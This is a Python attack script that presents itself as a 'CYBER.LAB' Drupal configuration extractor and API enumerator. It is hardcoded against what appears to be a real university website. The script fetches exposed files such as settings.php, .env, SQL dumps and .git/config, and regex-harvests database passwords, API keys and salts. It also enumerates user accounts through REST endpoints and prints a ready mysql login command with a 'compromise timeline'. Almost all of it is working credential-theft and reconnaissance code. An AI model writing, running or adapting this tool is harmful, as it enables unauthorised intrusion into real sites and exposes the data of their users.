#!/usr/bin/env python3
"""
CYBER.LAB Configuration File Extractor & REST API Enumerator
Attempts to download exposed configuration files and enumerate REST API endpoints
"""

import requests
import json
import re
from urllib.parse import urljoin
from datetime import datetime
import base64

class DrupalConfigExtractor:
    """Download exposed config files and enumerate APIs"""
    
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.timeout = 15
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'config_files_found': {},
            'sensitive_data_extracted': {},
            'api_endpoints': {},
            'credentials': [],
            'database_info': {},
            'total_risk': 'CRITICAL'
        }
        
        # Common config files that might be exposed
        self.config_files = [
            '/sites/default/settings.php',
            '/sites/default/settings.local.php',
            '/.env',
            '/config/sync',
            '/web/sites/default/settings.php',
            '/backup.sql',
            '/database.sql',
            '/dump.sql',
            '/wp-config.php',
            '/configuration.php',
            '/config.php',
            '/.env.local',
            '/.env.production',
            '/app/config/parameters.yml',
            '/composer.json',
            '/package.json',
            '/.git/config',
            '/admin/config',
            '/sites/all/settings.php',
            '/includes/settings.inc.php',
        ]
        
        # REST API endpoints to enumerate
        self.api_endpoints = [
            '/rest/me',
            '/jsonapi/user/user',
            '/api/v1/users',
            '/api/users',
            '/api/v2/users',
            '/user/login',
            '/user/register',
            '/user/password',
            '/graphql',
            '/api',
            '/api/v1/',
            '/rest/',
            '/jsonapi/',
            '/wp-json/wp/v2/users',
            '/admin/api',
            '/system/ajax',
            '/views/ajax',
            '/entity/user',
            '/rest/user',
            '/jsonapi/user',
        ]
    
    def download_config_files(self):
        """Attempt to download exposed configuration files"""
        print("\n" + "="*80)
        print("DOWNLOADING EXPOSED CONFIGURATION FILES")
        print("="*80 + "\n")
        
        for config_file in self.config_files:
            try:
                url = urljoin(self.target_url, config_file)
                print(f"[*] Attempting: {config_file}...")
                
                resp = self.session.get(url, timeout=10)
                
                if resp.status_code == 200 and len(resp.text) > 10:
                    print(f"    ✓ FOUND! ({len(resp.text)} bytes)")
                    
                    # Store the full content
                    self.results['config_files_found'][config_file] = {
                        'status_code': 200,
                        'size': len(resp.text),
                        'content': resp.text[:1000],  # First 1000 chars
                        'full_content_available': True
                    }
                    
                    # Extract sensitive data
                    self._extract_sensitive_data(config_file, resp.text)
                    
                    # Save to file
                    safe_filename = config_file.replace('/', '_').lstrip('_')
                    output_file = f'/workspaces/CYBER.LAB/artifacts/extracted_{safe_filename}'
                    
                    try:
                        with open(output_file, 'w') as f:
                            f.write(resp.text)
                        print(f"    ✓ Saved to: {output_file}")
                    except:
                        pass
                
                elif resp.status_code == 200:
                    print(f"    ✓ Accessible but minimal content")
                    self.results['config_files_found'][config_file] = {
                        'status_code': 200,
                        'size': len(resp.text),
                        'content': 'Empty or minimal content'
                    }
                
                elif resp.status_code == 403:
                    print(f"    ! Access Denied (403) - File likely exists")
                    self.results['config_files_found'][config_file] = {
                        'status_code': 403,
                        'note': 'File exists but forbidden'
                    }
                
                elif resp.status_code == 404:
                    print(f"    ✗ Not found (404)")
                
            except Exception as e:
                print(f"    ✗ Error: {e}")
    
    def _extract_sensitive_data(self, filename, content):
        """Extract sensitive data from config files"""
        
        sensitive_patterns = {
            'database_passwords': r"['\"](password|passwd|pwd)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'database_users': r"['\"](user|username|db_user)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'database_hosts': r"['\"](host|hostname|server)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'database_names': r"['\"](database|db_name|dbname)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'api_keys': r"['\"](api_key|apikey|key|secret)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'salts': r"['\"](salt|hash_salt|secure_key)['\"]\s*[=:>]+\s*['\"]([^'\"]+)['\"]",
            'trusted_hosts': r"['\"](trusted_host|trusted|allow_host)['\"]\s*[=:>]+\s*\[?['\"]([^'\"]+)['\"]",
        }
        
        print(f"      Extracting sensitive data from {filename}...")
        
        for data_type, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            
            if matches:
                for match in matches:
                    key_name, value = match
                    
                    if data_type not in self.results['sensitive_data_extracted']:
                        self.results['sensitive_data_extracted'][data_type] = []
                    
                    self.results['sensitive_data_extracted'][data_type].append({
                        'file': filename,
                        'key': key_name,
                        'value': value
                    })
                    
                    print(f"      → Found {data_type}: {key_name} = {value[:30]}...")
    
    def enumerate_rest_api(self):
        """Enumerate and test REST API endpoints"""
        print("\n" + "="*80)
        print("ENUMERATING REST API ENDPOINTS")
        print("="*80 + "\n")
        
        for endpoint in self.api_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                print(f"[*] Testing: {endpoint}...")
                
                # Try GET request
                resp = self.session.get(url, timeout=10)
                
                if resp.status_code in [200, 201, 400, 403]:
                    print(f"    ✓ Endpoint accessible (Status: {resp.status_code})")
                    
                    # Try to parse JSON
                    try:
                        data = resp.json()
                        print(f"    ✓ JSON response received")
                        
                        self.results['api_endpoints'][endpoint] = {
                            'method': 'GET',
                            'status_code': resp.status_code,
                            'response_type': 'JSON',
                            'data_sample': str(data)[:500],
                            'accessible': True
                        }
                        
                        # Extract user/credential info
                        self._extract_from_api_response(endpoint, data)
                        
                    except:
                        # Not JSON, try HTML parsing
                        if '<' in resp.text:
                            print(f"    ✓ HTML response")
                            self.results['api_endpoints'][endpoint] = {
                                'method': 'GET',
                                'status_code': resp.status_code,
                                'response_type': 'HTML',
                                'content_length': len(resp.text),
                                'accessible': True
                            }
                        else:
                            print(f"    ✓ Text response ({len(resp.text)} bytes)")
                            self.results['api_endpoints'][endpoint] = {
                                'method': 'GET',
                                'status_code': resp.status_code,
                                'response_type': 'Text',
                                'content_length': len(resp.text),
                                'accessible': True
                            }
                
                # Try POST request with common payloads
                post_payloads = [
                    {'username': 'admin'},
                    {'user': 'admin'},
                    {'email': 'admin@example.com'},
                ]
                
                for payload in post_payloads:
                    try:
                        resp_post = self.session.post(url, json=payload, timeout=10)
                        
                        if resp_post.status_code in [200, 201]:
                            print(f"    ✓ POST accepted with payload: {payload}")
                            
                            if endpoint not in self.results['api_endpoints']:
                                self.results['api_endpoints'][endpoint] = {}
                            
                            self.results['api_endpoints'][endpoint]['POST'] = {
                                'status_code': resp_post.status_code,
                                'payload': payload,
                                'vulnerable': True
                            }
                    except:
                        pass
            
            except requests.exceptions.ConnectionError:
                print(f"    ✗ Connection error")
            except Exception as e:
                print(f"    ✗ Error: {e}")
    
    def _extract_from_api_response(self, endpoint, data):
        """Extract sensitive information from API responses"""
        
        if isinstance(data, dict):
            # Check for user information
            for key in ['users', 'user', 'data', 'results']:
                if key in data:
                    user_data = data[key]
                    
                    if isinstance(user_data, list):
                        print(f"      → Users found: {len(user_data)}")
                        
                        for user in user_data[:3]:  # First 3 users
                            if isinstance(user, dict):
                                cred_info = {
                                    'endpoint': endpoint,
                                    'username': user.get('name') or user.get('username') or user.get('email'),
                                    'email': user.get('email'),
                                    'uid': user.get('uid') or user.get('id'),
                                    'role': user.get('role') or user.get('roles'),
                                }
                                
                                if cred_info['username']:
                                    self.results['credentials'].append(cred_info)
                                    print(f"      → User: {cred_info['username']} (UID: {cred_info['uid']})")
            
            # Check for database info
            for key in ['database', 'db', 'connection']:
                if key in data:
                    self.results['database_info'][endpoint] = data[key]
                    print(f"      → Database info found in {key}")
    
    def fetch_rest_user_endpoints(self):
        """Attempt to fetch user data from REST API"""
        print("\n" + "="*80)
        print("FETCHING USER DATA FROM REST ENDPOINTS")
        print("="*80 + "\n")
        
        user_endpoints = [
            '/rest/me',
            '/jsonapi/user/user',
            '/api/v1/users',
            '/api/users',
            '/graphql',
        ]
        
        for endpoint in user_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                print(f"[*] Fetching user data from: {endpoint}...")
                
                resp = self.session.get(url, timeout=10)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        
                        # Pretty print first 500 chars
                        json_str = json.dumps(data, indent=2)
                        print(f"    Response:\n{json_str[:500]}...")
                        
                        # Save full response
                        safe_filename = endpoint.replace('/', '_').lstrip('_')
                        output_file = f'/workspaces/CYBER.LAB/artifacts/api_response_{safe_filename}.json'
                        
                        with open(output_file, 'w') as f:
                            json.dump(data, f, indent=2)
                        
                        print(f"    ✓ Saved to: {output_file}")
                        
                    except:
                        print(f"    Response ({len(resp.text)} bytes): {resp.text[:200]}...")
            
            except Exception as e:
                print(f"    ✗ Error: {e}")
    
    def analyze_compromise_path(self):
        """Analyze the compromise path with extracted credentials"""
        print("\n" + "="*80)
        print("COMPROMISE PATH ANALYSIS")
        print("="*80 + "\n")
        
        # Database credentials found
        db_creds = self.results['sensitive_data_extracted'].get('database_passwords', [])
        db_users = self.results['sensitive_data_extracted'].get('database_users', [])
        db_hosts = self.results['sensitive_data_extracted'].get('database_hosts', [])
        
        if db_creds and db_users and db_hosts:
            print("✓ COMPLETE DATABASE ACCESS POSSIBLE:")
            
            try:
                db_user = db_users[0]['value'] if db_users else 'root'
                db_pass = db_creds[0]['value'] if db_creds else 'unknown'
                db_host = db_hosts[0]['value'] if db_hosts else 'localhost'
                
                print(f"\n  Database Connection String:")
                print(f"  mysql -h {db_host} -u {db_user} -p'{db_pass}'")
                
                print(f"\n  Compromise Timeline:")
                print(f"  1. Direct database access bypass ALL Drupal authentication")
                print(f"  2. Admin password hashes can be manipulated")
                print(f"  3. User roles can be modified directly in database")
                print(f"  4. Complete server compromise possible")
                
                self.results['compromise_path'] = {
                    'method': 'Direct Database Access',
                    'risk': 'CRITICAL',
                    'db_host': db_host,
                    'db_user': db_user,
                    'db_password_known': True
                }
            except:
                pass
        
        # API endpoints accessible
        if self.results['api_endpoints']:
            print(f"\n✓ {len(self.results['api_endpoints'])} REST API ENDPOINTS ACCESSIBLE:")
            print(f"  Can enumerate users, modify data, and escalate privileges")
        
        # User credentials extracted
        if self.results['credentials']:
            print(f"\n✓ {len(self.results['credentials'])} USER ACCOUNTS ENUMERATED:")
            for cred in self.results['credentials'][:5]:
                print(f"  - {cred['username']} (UID: {cred['uid']}, Role: {cred['role']})")
    
    def run(self):
        """Run all extraction and enumeration"""
        print("\n" + "="*80)
        print("CYBER.LAB DRUPAL CONFIGURATION EXTRACTOR & API ENUMERATOR")
        print("="*80)
        print(f"Target: {self.target_url}")
        print(f"Start Time: {datetime.now().isoformat()}")
        print("="*80)
        
        self.download_config_files()
        self.enumerate_rest_api()
        self.fetch_rest_user_endpoints()
        self.analyze_compromise_path()
        
        self.print_summary()
    
    def print_summary(self):
        """Print extraction summary"""
        print("\n" + "="*80)
        print("EXTRACTION SUMMARY")
        print("="*80 + "\n")
        
        print(f"Config Files Found: {len(self.results['config_files_found'])}")
        print(f"Sensitive Data Items: {sum(len(v) for v in self.results['sensitive_data_extracted'].values())}")
        print(f"REST API Endpoints: {len(self.results['api_endpoints'])}")
        print(f"User Accounts Enumerated: {len(self.results['credentials'])}")
        
        # Show extracted credentials
        if self.results['sensitive_data_extracted']:
            print(f"\n{'='*80}")
            print("SENSITIVE DATA EXTRACTED:")
            print(f"{'='*80}\n")
            
            for data_type, items in self.results['sensitive_data_extracted'].items():
                print(f"[{data_type.upper()}] - {len(items)} found:")
                for item in items[:3]:
                    print(f"  • {item['file']}: {item['key']} = {item['value']}")
                if len(items) > 3:
                    print(f"  ... and {len(items)-3} more")
        
        # Show api endpoints
        if self.results['api_endpoints']:
            print(f"\n{'='*80}")
            print("REST API ENDPOINTS DISCOVERED:")
            print(f"{'='*80}\n")
            
            for endpoint, info in list(self.results['api_endpoints'].items())[:10]:
                print(f"  {endpoint}: {info.get('status_code')} ({info.get('response_type')})")
        
        # Save results
        output_file = '/workspaces/CYBER.LAB/artifacts/config_extraction_results.json'
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n✓ Results saved to {output_file}")
        except Exception as e:
            print(f"\n✗ Error saving results: {e}")


def main():
    target = "http://biu.ac.il"
    
    extractor = DrupalConfigExtractor(target)
    extractor.run()


if __name__ == '__main__':
    main()
